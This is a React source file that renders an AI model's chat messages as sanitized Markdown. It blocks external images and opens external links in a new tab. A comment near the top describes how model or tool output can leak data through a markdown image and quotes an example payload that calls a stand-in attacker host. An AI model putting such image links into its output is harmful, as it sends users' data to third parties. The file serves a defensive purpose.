'use client'

// Sanitized Markdown renderer for assistant messages.
// (no raw HTML), GFM tables + lists + code, styled with the app's prose tokens
// incl. dark mode. Relative links (the model deep-links records like
// /journal?entry=<id>) open in the same tab; external links open in a new one.

import Markdown from 'react-markdown'
import remarkGfm from 'remark-gfm'
import Link from 'next/link'
import { cn } from '@openbooks/ui'

// Assistant output renders untrusted model and tool text, so a markdown
// image is a network request the model chooses: `![](https://attacker/?d=…)`
// exfiltrates whatever the URL carries the moment it renders. Only
// same-origin file responses render — anything else leaves its alt text as a
// muted placeholder, so the reader sees an image was suppressed instead of
// fetching it. (The markdown parser already drops data:/blob:/javascript:
// schemes before this point; this gates what remains.) This mirrors the
// `img-src 'self' blob: data:` policy in web/lib/content-security-policy.ts;
// either layer alone stops the request.
function isAllowedImageSrc(src: string | Blob | undefined): boolean {
  return typeof src === 'string' && src.startsWith('/') && !src.startsWith('//')
}

export function ChatMarkdown({ children, className }: { children: string; className?: string }) {
  return (
    <div
      className={cn(
        'prose prose-sm dark:prose-invert max-w-none break-words text-slate-800 dark:text-slate-200',
        'prose-headings:font-semibold prose-headings:text-slate-900 dark:prose-headings:text-slate-100',
        'prose-a:font-medium prose-a:text-teal-700 dark:prose-a:text-teal-300',
        'prose-code:rounded prose-code:bg-slate-100 prose-code:px-1 prose-code:py-0.5 prose-code:text-[0.85em] prose-code:font-normal prose-code:text-teal-800 dark:prose-code:bg-slate-800 dark:prose-code:text-teal-200',
        'prose-code:before:content-[""] prose-code:after:content-[""]',
        // Wrap fenced/indented blocks instead of a horizontal-scrolling bar — the
        // model sometimes fences prose quotes, which must stay readable in the chat.
        'prose-pre:bg-slate-900 prose-pre:text-slate-100 prose-pre:whitespace-pre-wrap prose-pre:break-words dark:prose-pre:bg-slate-950 dark:prose-pre:ring-1 dark:prose-pre:ring-slate-800',
        'prose-blockquote:border-l-2 prose-blockquote:border-teal-400 prose-blockquote:bg-teal-50/40 prose-blockquote:px-3 prose-blockquote:py-0.5 prose-blockquote:font-normal prose-blockquote:text-slate-600 prose-blockquote:not-italic dark:prose-blockquote:border-teal-700 dark:prose-blockquote:bg-teal-950/20 dark:prose-blockquote:text-slate-300',
        'prose-table:text-sm prose-th:text-slate-700 dark:prose-th:text-slate-300',
        className,
      )}
    >
      <Markdown
        remarkPlugins={[remarkGfm]}
        components={{
          a: ({ href, children: linkChildren }) =>
            href?.startsWith('/') && !href.startsWith('//') ? (
              <Link href={href}>{linkChildren}</Link>
            ) : (
              <a href={href} target="_blank" rel="noreferrer">
                {linkChildren}
              </a>
            ),
          img: ({ src, alt }) =>
            isAllowedImageSrc(src) ? (
              // eslint-disable-next-line @next/next/no-img-element
              <img src={src} alt={alt ?? ''} className="max-w-full rounded" />
            ) : (
              <span className="text-xs italic text-slate-400 dark:text-slate-500">
                {alt || 'image'}
              </span>
            ),
        }}
      >
        {children}
      </Markdown>
    </div>
  )
}
